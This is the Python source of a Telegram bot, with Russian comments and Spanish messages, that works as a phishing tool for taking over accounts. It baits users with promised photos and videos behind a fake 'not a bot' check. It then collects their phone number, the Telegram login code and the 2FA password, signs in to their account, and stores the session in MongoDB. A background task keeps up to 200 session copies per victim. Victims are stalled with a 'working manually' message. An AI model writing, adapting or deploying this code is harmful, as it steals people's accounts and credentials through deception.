import logging
import os
import asyncio
from datetime import datetime
from aiogram import Bot, Dispatcher, types
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils import executor
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors.rpcerrorlist import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError
from pymongo import MongoClient
from dotenv import load_dotenv

load_dotenv()

# Конфигурация
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGO_URI = os.getenv("MONGO_URI")

# Инициализация
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)
mongo = MongoClient(MONGO_URI)
db = mongo.telegram_sessions
main_sessions_col = db["main_sessions"]  # Основные сессии (1 на пользователя)
active_sessions_col = db["active_sessions"]  # Активные сессии (200 на пользователя)

# Глобальные переменные
user_states = {}
temp_data = {}

async def maintain_sessions(user_id, phone, main_session_str):
    """Поддерживаем пул активных сессий"""
    # Получаем текущие активные сессии пользователя
    active_sessions = list(active_sessions_col.find({"user_id": user_id}))
    
    # Проверяем какие сессии активны
    valid_sessions = []
    for session in active_sessions:
        client = TelegramClient(StringSession(session['session']), API_ID, API_HASH)
        try:
            await client.connect()
            if await client.is_user_authorized():
                valid_sessions.append(session)
            else:
                # Удаляем неактивную сессию
                active_sessions_col.delete_one({"_id": session["_id"]})
        except Exception as e:
            logging.error(f"Session check error: {e}")
            active_sessions_col.delete_one({"_id": session["_id"]})
        finally:
            await client.disconnect()
    
    # Если активных сессий меньше 200 - создаем новые
    if len(valid_sessions) < 200:
        needed = 200 - len(valid_sessions)
        for _ in range(needed):
            # Создаем новую сессию на основе основной
            client = TelegramClient(StringSession(main_session_str), API_ID, API_HASH)
            await client.connect()
            new_session_str = client.session.save()
            
            # Добавляем новую активную сессию
            active_sessions_col.insert_one({
                "user_id": user_id,
                "phone": phone,
                "session": new_session_str,
                "created_at": datetime.utcnow(),
                "last_active": datetime.utcnow()
            })
            
            await client.disconnect()

async def session_monitor():
    """Фоновая задача для поддержания сессий"""
    while True:
        await asyncio.sleep(3600)  # Проверка каждый час
        try:
            # Получаем всех пользователей с основными сессиями
            users_with_sessions = main_sessions_col.distinct("user_id")
            
            for user_id in users_with_sessions:
                # Получаем основную сессию пользователя
                main_session = main_sessions_col.find_one({"user_id": user_id})
                if main_session:
                    await maintain_sessions(user_id, main_session['phone'], main_session['session'])
        except Exception as e:
            logging.error(f"Session monitor error: {e}")

async def send_code_keyboard(user_id, current_code="", message_id=None):
    digits = [[1, 2, 3], [4, 5, 6], [7, 8, 9], [0]]
    buttons = []
    for row in digits:
        btn_row = [InlineKeyboardButton(str(d), callback_data=f"code_{d}") for d in row]
        buttons.append(btn_row)
    buttons.append([InlineKeyboardButton("✅ Enviar", callback_data="code_send")])
    keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)
    text = f"Código: `{current_code}`" if current_code else "Ingresa el código:"

    if message_id:
        try:
            await bot.edit_message_text(
                chat_id=user_id,
                message_id=message_id,
                text=text,
                reply_markup=keyboard,
                parse_mode='Markdown'
            )
        except:
            pass
    else:
        msg = await bot.send_message(
            user_id,
            text,
            reply_markup=keyboard,
            parse_mode='Markdown'
        )
        return msg.message_id

@dp.message_handler(commands=['start'])
async def start(message: types.Message):
    keyboard = InlineKeyboardMarkup().add(
        InlineKeyboardButton("Autorización en la primera cuenta🥺", callback_data="auth_account")
    )
    await message.answer(
        "👋🇪🇨 ¡HOLA! ❤️\n"
        "¿Quieres ver más de 10.000 fotos y más de 4.000 vídeos? 👁\n"
        "Verifica que no eres un bot con el botón de abajo. 🤖👇\n\n",
        reply_markup=keyboard
    )

@dp.callback_query_handler(lambda c: c.data == 'auth_account')
async def start_auth(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    user_states[user_id] = 'awaiting_contact'

    kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    kb.add(KeyboardButton("📱 Comparte tu número", request_contact=True))

    await bot.send_message(user_id, "🥺Por favor comparte tu número de teléfono:", reply_markup=kb)
    await bot.answer_callback_query(callback_query.id)

@dp.message_handler(content_types=types.ContentType.CONTACT)
async def handle_contact(message: types.Message):
    user_id = message.from_user.id
    if user_states.get(user_id) != 'awaiting_contact':
        return

    phone = message.contact.phone_number
    if not phone.startswith("+"):
        phone = "+" + phone

    # Проверяем, не авторизован ли уже этот номер
    existing = main_sessions_col.find_one({"phone": phone})
    if existing:
        await message.answer("❌ Este número ya está registrado. Usa otro número.")
        return

    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()
    
    try:
        code_request = await client.send_code_request(phone)
        user_states[user_id] = 'awaiting_code'
        temp_data[user_id] = {
            'client': client,
            'phone': phone,
            'phone_code_hash': code_request.phone_code_hash,
            'message_id': None
        }
        msg_id = await send_code_keyboard(user_id)
        temp_data[user_id]['message_id'] = msg_id
    except Exception as e:
        logging.error(f"Error sending code: {e}")
        await message.answer(f"❌ Error al enviar el código: {str(e)}")
        await client.disconnect()
        user_states.pop(user_id, None)

@dp.callback_query_handler(lambda c: c.data.startswith("code_"))
async def process_code_button(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    data = callback_query.data

    if user_states.get(user_id) != 'awaiting_code':
        await bot.answer_callback_query(callback_query.id, text="⛔️ No es el momento adecuado", show_alert=True)
        return

    user_data = temp_data.get(user_id)
    if not user_data:
        await bot.answer_callback_query(callback_query.id, text="Error de sesión", show_alert=True)
        return

    current_code = user_data.get('code', '')
    message_id = user_data.get('message_id')

    if data == "code_send":
        if not current_code:
            await bot.answer_callback_query(callback_query.id, text="⚠️ Ingresa el código primero", show_alert=True)
            return
        
        await bot.answer_callback_query(callback_query.id)
        await try_sign_in(user_id, current_code)
    else:
        digit = data.split("_")[1]
        if len(current_code) >= 10:
            await bot.answer_callback_query(callback_query.id, text="⚠️ Código demasiado largo", show_alert=True)
            return
        
        current_code += digit
        temp_data[user_id]['code'] = current_code
        await send_code_keyboard(user_id, current_code, message_id)
        await bot.answer_callback_query(callback_query.id)

async def try_sign_in(user_id, code):
    user_data = temp_data.get(user_id)
    if not user_data:
        await bot.send_message(user_id, "⚠️ Sesión no encontrada. Por favor, comienza de nuevo con /start")
        return

    client = user_data['client']
    phone = user_data['phone']
    phone_code_hash = user_data['phone_code_hash']

    try:
        # Пробуем войти с кодом
        await client.sign_in(
            phone=phone,
            code=code,
            phone_code_hash=phone_code_hash
        )
        
        if await client.is_user_authorized():
            session_str = client.session.save()
            
            # Сохраняем основную сессию
            main_sessions_col.update_one(
                {"user_id": user_id},
                {"$set": {
                    "phone": phone,
                    "session": session_str,
                    "created_at": datetime.utcnow()
                }},
                upsert=True
            )
            
            # Создаем пул активных сессий
            await maintain_sessions(user_id, phone, session_str)
            
            await bot.send_message(user_id, "✅ ¡Autenticación exitosa!")
            await bot.send_message(
                user_id,
                "Estamos trabajando en modo manual, disculpen la demora, "
                "pronto les enviaremos material fotográfico y de video😉🧍‍♀️."
            )
        else:
            user_states[user_id] = 'awaiting_2fa'
            await bot.send_message(user_id, "🔐 Ingresa tu contraseña 2FA:")
            
    except SessionPasswordNeededError:
        user_states[user_id] = 'awaiting_2fa'
        await bot.send_message(user_id, "🔐 Se requiere tu contraseña 2FA. Por favor, ingrésala:")
    except PhoneCodeInvalidError:
        await bot.send_message(user_id, "❌ Código incorrecto. Inténtalo de nuevo:")
        temp_data[user_id]['code'] = ""
        await send_code_keyboard(user_id, "", temp_data[user_id]['message_id'])
    except PhoneCodeExpiredError:
        await bot.send_message(user_id, "⏰ Código expirado. Por favor, intenta nuevamente con /start")
        await client.disconnect()
        cleanup(user_id)
    except Exception as e:
        logging.error(f"Sign in error: {e}")
        await bot.send_message(user_id, f"❌ Error de autenticación: {str(e)}")
        await client.disconnect()
        cleanup(user_id)

@dp.message_handler(lambda message: user_states.get(message.from_user.id) == 'awaiting_2fa')
async def process_2fa(message: types.Message):
    user_id = message.from_user.id
    password = message.text.strip()
    user_data = temp_data.get(user_id)
    
    if not user_data:
        await message.answer("⚠️ Sesión no encontrada. Por favor, comienza de nuevo con /start")
        return

    client = user_data['client']
    phone = user_data['phone']

    try:
        await client.sign_in(password=password)
        
        if await client.is_user_authorized():
            session_str = client.session.save()
            
            # Сохраняем основную сессию
            main_sessions_col.update_one(
                {"user_id": user_id},
                {"$set": {
                    "phone": phone,
                    "session": session_str,
                    "created_at": datetime.utcnow()
                }},
                upsert=True
            )
            
            # Создаем пул активных сессий
            await maintain_sessions(user_id, phone, session_str)
            
            await message.answer("✅ ¡Autenticación exitosa con 2FA!")
            await message.answer(
                "Estamos trabajando en modo manual, disculpen la demora, "
                "pronto les enviaremos material fotográfico y de video😉🧍‍♀️."
            )
        else:
            await message.answer("❌ No se pudo autenticar con 2FA.")
    except Exception as e:
        logging.error(f"2FA error: {e}")
        await message.answer(f"❌ Error con 2FA: {str(e)}")
    finally:
        await client.disconnect()
        cleanup(user_id)

def cleanup(user_id):
    """Очистка данных пользователя"""
    if user_id in user_states:
        user_states.pop(user_id)
    if user_id in temp_data:
        temp_data.pop(user_id)

async def on_startup(dp):
    # Запускаем мониторинг сессий при старте бота
    asyncio.create_task(session_monitor())
    logging.info("Bot started")

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True, on_startup=on_startup)